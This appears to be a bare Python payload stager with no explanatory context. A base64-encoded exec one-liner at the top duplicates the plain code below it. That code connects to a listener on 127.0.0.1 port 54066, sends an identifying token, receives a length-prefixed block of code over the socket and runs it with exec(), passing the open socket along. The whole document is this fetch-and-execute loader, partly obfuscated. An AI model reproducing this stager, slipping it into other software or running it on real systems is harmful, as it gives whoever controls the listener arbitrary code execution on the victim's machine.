'''
/usr/bin/python -c exec(__import__('base64').b64decode('CmltcG9ydCBvcyxzb2NrZXQsc3RydWN0CnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoJzEyNy4wLjAuMScsIDU0MDY2KSkKbiA9IGInZWI0OTRjMDFkYTRmMTIyNTQ3ZWZkYjRkNjJlNTAzZDQnCnMuc2VuZGFsbChzdHJ1Y3QucGFjaygnIUklZHMnJWxlbihuKSwgbGVuKG4pLCBuKSkKYnVmID0gYicnCmFjayA9IDAKd2hpbGUgVHJ1ZToKICAgIGlmIGFjayA+IDA6CiAgICAgICAgaWYgbGVuKGJ1ZikgLSA0ID49IGFjazoKICAgICAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgICAgIGV4ZWMoYnVmWzQ6NCthY2tdLCB7J3MnOnMsICdfX25hbWVfXyc6J19fbWFpbl9fJ30pCiAgICAgICAgICAgIGJyZWFrCiAgICBlbGlmIGxlbihidWYpID49IDQ6CiAgICAgICAgYWNrLCA9IHN0cnVjdC51bnBhY2soJyFJJywgYnVmWzo0XSkKICAgICAgICBjb250aW51ZQogICAgckxlbiA9IDQKICAgIGlmIGFjayA+IDA6CiAgICAgICAgckxlbiA9IChhY2sgLSAobGVuKGJ1ZikgLSA0KSkKICAgIGJ1ZiArPSBzLnJlY3YockxlbikKcy5jbG9zZSgp'))
'''

import os,socket,struct
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 54066))
n = b'eb494c01da4f122547efdb4d62e503d4'
s.sendall(struct.pack('!I%ds'%len(n), len(n), n))
buf = b''
ack = 0
while True:
    if ack > 0:
        if len(buf) - 4 >= ack:
            s.close()
            exec(buf[4:4+ack], {'s':s, '__name__':'__main__'})
            break
    elif len(buf) >= 4:
        ack, = struct.unpack('!I', buf[:4])
        continue
    rLen = 4
    if ack > 0:
        rLen = (ack - (len(buf) - 4))
    buf += s.recv(rLen)
s.close()
